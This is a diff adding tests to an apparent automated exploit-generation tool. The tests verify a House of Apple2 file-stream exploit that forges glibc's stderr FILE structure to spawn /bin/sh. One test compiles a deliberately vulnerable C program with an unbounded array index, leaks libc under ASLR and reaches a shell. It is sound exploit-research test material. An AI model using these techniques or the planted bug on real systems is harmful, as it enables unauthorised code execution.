@@ -110,3 +110,83 @@ def test_house_of_apple2_spawns_shell_on_this_libc():
             p.kill()
     finally:
         shutil.rmtree(d, ignore_errors=True)
+
+
+# ---------------------------------------------------------------- cell-at-a-time delivery (CWE-129)
+# An `arr[i] = v` primitive writes ONE WORD at a chosen address, and the target's own code -- its
+# next prompt -- runs between every write. The 0x300 blob above cannot be delivered that way: it
+# lands over _IO_2_1_stdout_ and the stdout/stderr/stdin pointer variables that follow it, so the
+# half-built FILE is used before it is finished. Five cells over a FILE the program never touches.
+def test_house_of_apple2_cells_are_five_ordered_writes():
+    cells = heap.house_of_apple2_cells(0x1000, wide_data=0x2000, wide_vtable=0x404060,
+                                       wfile_jumps=0xAAAA, system=0xBBBB)
+    assert cells == [(0x404060 + 0x68, 0xBBBB),          # the fake wide jump table's __doallocate
+                     (0x2000 + 0xE0, 0x404060),          # the real _wide_data's _wide_vtable
+                     (0x1000 + 0x28, 1),                 # _IO_write_ptr > _IO_write_base
+                     (0x1000 + 0xD8, 0xAAAA),            # vtable == _IO_wfile_jumps
+                     (0x1000, struct.unpack("<Q", b" /bin/sh")[0])]
+    # _flags LAST: the command's leading space is _IO_ERR_SEEN, so writing it earlier stops that
+    # FILE being usable -- which matters when the only forgeable FILE is one still being read.
+    assert cells[-1][0] == 0x1000
+
+
+def test_house_of_apple2_cell_targets_name_a_file_the_program_does_not_use():
+    if not _SYS_LIBC:
+        pytest.skip("no system libc")
+    T = heap.house_of_apple2_cell_targets(open(_SYS_LIBC, "rb").read())
+    assert T["fp_name"] == "_IO_2_1_stderr_" and T["fp"] > 0
+    assert T["wfile_jumps"] > 0 and T["system"] > 0
+
+
+_IDX_MENU = r'''#include <stdio.h>
+long table[16];
+int main(void){ setvbuf(stdout,0,2,0);
+  for(;;){ printf("1.set 2.get 3.exit\n> ");
+    int o; if(scanf("%d",&o)!=1) return 0;
+    if(o==1){ long i,v; printf("idx: "); if(scanf("%ld",&i)!=1) return 0;
+              printf("val: "); if(scanf("%ld",&v)!=1) return 0;
+              table[i]=v; }
+    else if(o==2){ long i; printf("idx: "); if(scanf("%ld",&i)!=1) return 0;
+                   printf("%ld\n", table[i]); }
+    else return 0; } }
+'''
+
+
+def test_indexed_write_fsop_reaches_a_shell_with_no_win_function():
+    """The whole no-win route, live: an unbounded `table[i]` read recovers the libc base from a GOT
+    slot under real ASLR, the paired write places the five cells over _IO_2_1_stderr_, and exit()
+    spawns a shell. The fixture has no win function and no system() in its PLT, so every existing
+    L2->L3 recipe is inapplicable by construction."""
+    import tempfile
+    from pathlib import Path
+
+    from lykos.analyze.dynamic import sandbox
+    from lykos.analyze.poc import leak, rop
+    if sandbox.host_arch() != "x86-64" or not _SYS_LIBC:
+        pytest.skip("x86-64 + system libc required")
+    gcc = shutil.which("gcc") or shutil.which("cc")
+    if not gcc:
+        pytest.skip("no C compiler")
+    d = Path(tempfile.mkdtemp())
+    try:
+        (d / "t.c").write_text(_IDX_MENU)
+        exe = d / "idx"
+        if subprocess.run([gcc, "-no-pie", "-fno-stack-protector", "-O0", "-w", str(d / "t.c"),
+                           "-o", str(exe)], capture_output=True).returncode:
+            pytest.skip("build failed")
+        from lykos.analyze.poc import exploit
+        blob = exe.read_bytes()
+        table = exploit.elf_objects_sized(blob)["table"][0]
+        res = leak.indexed_write_fsop(
+            exe, d,
+            write_cell=lambda a, v: b"1\n%d\n%d\n" % ((a - table) // 8,
+                                                      struct.unpack("<q", struct.pack("<Q", v))[0]),
+            read_cell=lambda a: b"2\n%d\n" % ((a - table) // 8),
+            libc_data=open(_SYS_LIBC, "rb").read(),
+            leak_slots=[(a, n) for n, a in rop.got_entries(blob).items()],
+            scratch=table, exit_seqs=(b"3\n", b"q\n"))
+        assert res["ok"], res.get("reason")
+        assert res["libc_base"] % 0x1000 == 0 and len(res["cells"]) == 5
+        assert res["fp_name"] == "_IO_2_1_stderr_"
+    finally:
+        shutil.rmtree(d, ignore_errors=True)
